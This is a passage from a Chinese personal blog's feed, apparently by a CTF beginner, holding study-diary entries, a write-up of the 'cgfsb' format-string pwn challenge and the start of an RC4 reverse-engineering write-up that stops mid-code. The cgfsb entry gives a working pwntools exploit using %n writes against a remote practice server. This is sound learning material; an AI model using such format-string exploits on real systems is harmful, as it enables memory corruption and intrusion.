class="number">18</span>d<span class="number">76</span>ee<span class="number">232276</span><span class="keyword">c</span><span class="number">01315</span>cd&#125;</span><br></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>不着急，慢慢来！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">积土而为山，积水而为海。</span><br><span class="line">                                        ——《荀子•儒效》</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/09/27/uuZJj1.png" alt="uuZJj1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我好想有点入门了，哈哈！接下来就是在虚拟机中安装或者使用vim与sublime了，接下来要做的事情！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头05</title>
    <link href="http://yoursite.com/2019/10/01/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B405/"/>
    <id>http://yoursite.com/2019/10/01/疯狂的木头05/</id>
    <published>2019-10-01T14:49:27.000Z</published>
    <updated>2019-10-01T15:19:08.784Z</updated>
    
    <content type="html"><![CDATA[<p>越来越感到计划的必要性了，冲着一个目的去学，针对性很强，效率也便有了！</p><a id="more"></a><blockquote><p>最近状态:</p></blockquote><ol><li>嗯…最近状态极为不佳，万事皆有原因，不过不能以此空话作为我逃避的理由，状态不好就去找，心事压力什么的都暂时先收一收，抽个好时机再好好解决释放！</li><li>我今天就是原本想好好看看elf文件格式呢，看到一半又跑去看栈溢出漏洞（虽然它属于pwn中的hello，world，但也挺难的，当然是新入门的我来说的）目的不明确，注定两个都没能怎么把握！</li></ol><blockquote><p>今天国庆：</p></blockquote><ol><li>朋友圈被国庆刷屏了，很有气氛，但我没有看，然后我妈打电话说：给你一块的都回家了，你咋就不回来！因为我不甘呐，悟性不高，只能在时间上尽力去控住未来就业大局面！</li><li>成功之后的你才是最有魅力的！</li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只想赢，不想输，输不起！</span><br><span class="line"><span class="comment">//来自一ctf友的QQ签名！</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/ZqpExx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/16/ZqpExx.jpg" alt="ZqpExx.jpg"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;越来越感到计划的必要性了，冲着一个目的去学，针对性很强，效率也便有了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn00</title>
    <link href="http://yoursite.com/2019/09/30/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn00/"/>
    <id>http://yoursite.com/2019/09/30/国庆七天之pwn00/</id>
    <published>2019-09-30T13:10:46.000Z</published>
    <updated>2019-09-30T15:14:51.816Z</updated>
    
    <content type="html"><![CDATA[<p>pwn，入门难，进阶更难，早就听闻了，今天才是领略到了，说实话做得我有点一脸懵！</p><a id="more"></a><blockquote><p>pwn解题思路(by luobo)：</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>checksec  filename</span><br><span class="line"><span class="bullet">2. </span>IDA分析漏洞</span><br><span class="line"><span class="bullet">3. </span>利用漏洞-&gt;</span><br><span class="line"><span class="bullet">    - </span>system("/bin/sh")</span><br><span class="line"><span class="bullet">    - </span>One_gadget</span><br><span class="line"><span class="bullet">4. </span>python               pwntools</span><br><span class="line">5.ida   gdb ROPgadget</span><br></pre></td></tr></table></figure><blockquote><p>我们这里拿攻防世界pwn新手区的cgfsb来练习下：</p></blockquote><h2 id="查看可执行文件属性（常见保护）："><a href="#查看可执行文件属性（常见保护）：" class="headerlink" title="查看可执行文件属性（常见保护）："></a>查看可执行文件属性（常见保护）：</h2><blockquote><p>具体可以参考这篇博客，很详细。<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html" target="_blank" rel="noopener">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">checksec</span> <span class="string">cgfsb</span></span><br><span class="line"><span class="string">[*]</span> <span class="string">'/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/cgfsb'</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span>      <span class="comment">#开启了栈保护</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span>        <span class="comment">#开启了NX保护</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> </span><br><span class="line"></span><br><span class="line"><span class="string">mutou@mutou-vm:~/下载$</span> <span class="string">file</span> <span class="string">cgfsb</span></span><br><span class="line"><span class="attr">cgfsb:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=113a10b953bc39c6e182c4ce6e05582ba2f8017a,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里我们可以看出是Intel 80386 32-bit程序 动态链接</span></span><br></pre></td></tr></table></figure><h2 id="IDA分析漏洞"><a href="#IDA分析漏洞" class="headerlink" title="IDA分析漏洞"></a>IDA分析漏洞</h2><blockquote><p>拖入IDA：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"leave your message please:"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="comment">//格式化漏洞，所以即使该程序开启了NX与栈保护,</span></span><br><span class="line">  <span class="comment">//但我们其实利用的是格式化漏洞，不是栈溢出，都不需要绕过的！</span></span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you pwned me, here is your flag:\n"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="meta">#pwnme = 8后执行该系统命令，我们的最终目的</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们这里首先要知道格式化字符串漏洞的原理:(不是完全懂)</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串可以接受可变数量的参数，举个列子吧：</span><br><span class="line">比如我们常写的输出函数：<span class="keyword">printf</span>(<span class="string">"%s %s %S"</span>,a,b,c),双引号里面的相当于第一个参数：文件格式，后面的a,b,c（第<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>个）参数，我们称他们在参数列表中；</span><br><span class="line">当执行<span class="keyword">printf</span>函数前，系统将参数表中的a，b，c参数按倒序的顺序放入栈中（由高地址到地址）然后将文件格式放入栈中，；</span><br><span class="line">开始执行<span class="keyword">printf</span>函数，从（双引号里内容）左向右读取，</span><br><span class="line">遇到%s,便从参数表中的（栈中）第一个（顶）的数据所指地址中的数据按字符串格式输出，</span><br><span class="line">没遇到%s，就原样输出，</span><br><span class="line">再遇到就继续从参数表中自顶向上（高地址）取出数据所指地址中的数据按字符串格式输出。</span><br><span class="line"></span><br><span class="line">而<span class="keyword">printf</span>(b)时,就会直接把b作为输出格式进行解析，所以，我们可以在b中写入格式化字符的话，系统该走的流程还是要执行的，即是栈上没有参数表，但格式化参数（此时为b）上面的栈中数据都可以看成参数表中的数据.</span><br><span class="line">大致是这个样子。</span><br></pre></td></tr></table></figure><blockquote><p>所以，这样就会非法访问栈中数据，甚至造成任意地址读写，很危险；<br>OK，明白了漏洞原理，这里我们看下这个程序，将pwnme==8就是我们的目的！</p></blockquote><h3 id="找下bbbb所在栈上位置"><a href="#找下bbbb所在栈上位置" class="headerlink" title="找下bbbb所在栈上位置"></a>找下bbbb所在栈上位置</h3><p>name我们输入   aaaa<br>message输入   bbbb%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x (12个%8x)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mutou<span class="title">@mutou-vm</span>:~/下载$ ./cgfsb</span><br><span class="line">please tell me your name:</span><br><span class="line">aaaa</span><br><span class="line">leave your message please:</span><br><span class="line">bbbb.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span>.<span class="symbol">%08</span><span class="keyword">x</span></span><br><span class="line">hello aaaa</span><br><span class="line">your message is:</span><br><span class="line">bbbb.ffcb<span class="number">14</span>de.f<span class="number">7</span>f<span class="number">3</span>a<span class="number">5</span>a<span class="number">0.00</span>f<span class="number">0</span>b<span class="number">5</span>ff.ffcb<span class="number">150</span>e.<span class="number">00000001.000000</span><span class="keyword">c</span><span class="number">2.616186</span>bb.<span class="number">000</span>a<span class="number">6161.00000000</span>.<span class="number">62626262.3830252</span>e.<span class="number">30252e78</span> #我们发现第十个参数是存着bbbb的指针，</span><br><span class="line">Thank you!</span><br><span class="line">mutou<span class="title">@mutou-vm</span>:~/下载$</span><br></pre></td></tr></table></figure><p>我们再来了解下%n这个格式话字符串（来自网上）</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%c：輸出字符，配上%n可用於向指定地址寫數據。</span><br><span class="line"></span><br><span class="line">%d：輸出十進制整數，配上%n可用於向指定地址寫數據。</span><br><span class="line"></span><br><span class="line">%x：輸出<span class="number">16</span>進制數據，如%i$x表示要泄漏偏移i處<span class="number">4</span>字節長的<span class="number">16</span>進制數據，%i$lx表示要泄漏偏移i處<span class="number">8</span>字節長的<span class="number">16</span>進制數據，<span class="number">32</span>bit和<span class="number">64</span>bit環境下一樣。</span><br><span class="line"></span><br><span class="line">%p：輸出<span class="number">16</span>進制數據，與%x基本一樣，只是附加了前綴<span class="number">0</span>x，在<span class="number">32</span>bit下輸出<span class="number">4</span>字節，在<span class="number">64</span>bit下輸出<span class="number">8</span>字節，可通過輸出字節的長度來判斷目標環境是<span class="number">32</span>bit還是<span class="number">64</span>bit。</span><br><span class="line"></span><br><span class="line">%s：輸出的內容是字符串，即將偏移處指針指向的字符串輸出，如%i$s表示輸出偏移i處地址所指向的字符串，在<span class="number">32</span>bit和<span class="number">64</span>bit環境下一樣，可用於讀取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：將%n之前printf已經打印的字符個數賦值給偏移處指針所指向的地址位置，如%<span class="number">100</span>×<span class="number">10</span>$n表示將<span class="number">0x64</span>寫入偏移<span class="number">10</span>處保存的指針所指向的地址（<span class="number">4</span>字節），而%$hn表示寫入的地址空間爲<span class="number">2</span>字節，%$hhn表示寫入的地址空間爲<span class="number">1</span>字節，%$lln表示寫入的地址空間爲<span class="number">8</span>字節，在<span class="number">32</span>bit和<span class="number">64</span>bit環境下一樣。有時，直接寫<span class="number">4</span>字節會導致程序崩潰或等候時間過長，可以通過%$hn或%$hhn來適時調整。</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><blockquote><p>我们现在可以格式化字符串访问我们输入的 message，我们在借助于 %n这个格式化（向它对应的地址写入成功输出的字符数（字节）），向他对应的地址是  pwnme的地址，我们把pwnme的地址（在ida中双击查看即可我i这里是0804A068）放在bbbb处即可，因为  0804A068才四个字节，我们需要8个   在其后面+’a’*4就是成功输入8字节了，最后+’%10$n’，合在一起就是</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">p32</span><span class="params">(pwnme)</span></span>+<span class="string">'a'</span>*<span class="number">4</span>+<span class="string">'%10$n'</span></span><br><span class="line"><span class="comment">//'%10$n'   10指第十个参数，或者说偏移量为10*4，就是将当前成功输出字符（字节）数赋值给这个参数（pwnme地址）对应的内容</span></span><br></pre></td></tr></table></figure><h2 id="python脚本："><a href="#python脚本：" class="headerlink" title="python脚本："></a>python脚本：</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">pwnme</span>=0x0804A068</span><br><span class="line"><span class="attribute">mutou</span>=remote("111.198.29.45",50560)</span><br><span class="line"></span><br><span class="line"><span class="attribute">payloadname</span>=<span class="string">'aaaa'</span></span><br><span class="line"><span class="attribute">payloadmess</span>=p32(pwnme)+'a'*4+'%10$n'</span><br><span class="line"></span><br><span class="line">mutou.recvuntil(<span class="string">'please tell me your name:'</span>)</span><br><span class="line">mutou.sendline(payloadname)</span><br><span class="line"></span><br><span class="line">mutou.recvuntil(<span class="string">'leave your message please:'</span>)</span><br><span class="line">mutou.sendline(payloadmess)</span><br><span class="line"></span><br><span class="line">mutou.interactive()</span><br><span class="line"><span class="comment">#pwntools 使用详见https://bbs.pediy.com/thread-247217.htm</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ python cgfsb.py</span><br><span class="line">[+] Opening<span class="built_in"> connection </span><span class="keyword">to</span> 111.198.29.45 on<span class="built_in"> port </span>50560: Done</span><br><span class="line">[*] Switching <span class="keyword">to</span> interactive mode</span><br><span class="line"></span><br><span class="line">hello aaaa</span><br><span class="line">your message is:</span><br><span class="line">h\xa0\x0aaaa</span><br><span class="line">you pwned me, here is your flag:</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;1d5e7994e9896031cc3975f1538b832f&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  [1]   已杀死               gedit cgfsb.py</span><br><span class="line"></span><br><span class="line">[2]+  已停止               python cgfsb.py</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>cyberpeace{1d5e7994e9896031cc3975f1538b832f}</p></blockquote><h2 id="怎么就理解不清呢，得找找原因！"><a href="#怎么就理解不清呢，得找找原因！" class="headerlink" title="怎么就理解不清呢，得找找原因！"></a>怎么就理解不清呢，得找找原因！</h2><p>参考链接：<a href="https://www.twblogs.net/a/5d6d7290bd9eee5327ff19cc" target="_blank" rel="noopener">https://www.twblogs.net/a/5d6d7290bd9eee5327ff19cc</a></p><p><img src="https://s2.ax1x.com/2019/09/27/uuZGcR.png" alt="uuZGcR.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn，入门难，进阶更难，早就听闻了，今天才是领略到了，说实话做得我有点一脸懵！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ZKCTF9月赛 easy_re</title>
    <link href="http://yoursite.com/2019/09/28/ZKCTF9%E6%9C%88%E8%B5%9B%20easy_re/"/>
    <id>http://yoursite.com/2019/09/28/ZKCTF9月赛 easy_re/</id>
    <published>2019-09-28T14:07:24.000Z</published>
    <updated>2019-09-28T14:42:26.169Z</updated>
    
    <content type="html"><![CDATA[<p>实验室每月举行比赛了，害怕又期待！认真学就好了！</p><a id="more"></a><h1 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h1><p> 这道题真的懂得话，会很简单，但我没有做过RC4的题，做题太少了。</p><h2 id="拖入ida"><a href="#拖入ida" class="headerlink" title="拖入ida"></a>拖入ida</h2><blockquote><p>代码还看着还很清晰：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v3; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-130h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+38h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+50h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  s1[<span class="number">0</span>] = <span class="number">0x7E</span>;</span><br><span class="line">  s1[<span class="number">1</span>] = <span class="number">0x1E</span>;</span><br><span class="line">  s1[<span class="number">2</span>] = <span class="number">0xD4</span>u;</span><br><span class="line">  s1[<span class="number">3</span>] = <span class="number">0x81</span>u;</span><br><span class="line">  s1[<span class="number">4</span>] = <span class="number">0x42</span>;</span><br><span class="line">  s1[<span class="number">5</span>] = <span class="number">0xB2</span>u;</span><br><span class="line">  s1[<span class="number">6</span>] = <span class="number">0xA0</span>u;</span><br><span class="line">  s1[<span class="number">7</span>] = <span class="number">0x8F</span>u;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">"ilovectf"</span>);                        <span class="comment">// s=ilovectf</span></span><br><span class="line">  sub_40095F();                     <span class="comment">//输入信息，不用分析:puts("Please reverse me!");</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input flag:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);                               <span class="comment">// 8</span></span><br><span class="line">  sub_400666(&amp;v10, s, v3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">  sub_400823(&amp;v10, &amp;buf, v4);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, &amp;buf) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"success!,Please submit with flag&#123;your input&#125;"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;                                   <span class="comment">// buf=[0x7E,0x1E,0xD4,0x81,0x42,0xB2,0xA0,0x8F]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下sub_400666(&amp;v10, s, v3);这个函数</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400666(__int64 a1, __int64 a2, unsigned __int16 a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned<span class="built_in"> int </span>v3; // eax          a1=v10[256]         a2 = s<span class="string">"ilovectf"</span>     a3=8    </span><br><span class="line">  char v4; // ST27_1</span><br><span class="line">  signed<span class="built_in"> int </span>i; // [rsp+28h] [rbp-118h]</span><br><span class="line">  signed<span class="built_in"> int </span>j; // [rsp+28h] [rbp-118h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+2Ch] [rbp-114h]</span><br><span class="line">  char v9[264]; // [rsp+30h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+138h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  v8 = 0;</span><br><span class="line">  memset(v9, 0, 0x100u<span class="class">LL);</span></span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(i + a1) = i;                              // a1[256]=0-255</span><br><span class="line">    v9[i] = *(i % a3 + a2);                     // v9=  a[i%8]  (ilovectf)</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; j &lt;= 255; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = ((v9[j] + v8 + *(j + a1)) &gt;&gt; 31) &gt;&gt; 24;// v3=v9[j]+v8+(al[j]&gt;&gt;31)&gt;&gt;24</span><br><span class="line">    v8 = (v3 + v9[j] + v8 + *(j + a1)) - v3;    //    v8=v9+v8+al[j]</span><br><span class="line">    v4 = *(j + a1);                             // v4=al[j]</span><br><span class="line">    *(a1 + j) = *(v8 + a1);                     // a[j]=al[v8]</span><br><span class="line">    *(a1 + v8) = v4;                            // al[v8]=v4</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>__readfsqword(0x28u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里面注意下，函数里面有太多移位操作了，但大多数都相当于没有这些操作，一个字是2个字节，16位，双字就是32位，&gt;&gt;31后就等于0了，又&gt;&gt;24还是零，我们将其化简，见上面注释</p></blockquote><blockquote><p>我们接着看下sub_400823(&amp;v10, &amp;buf, v4);这个函数</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td 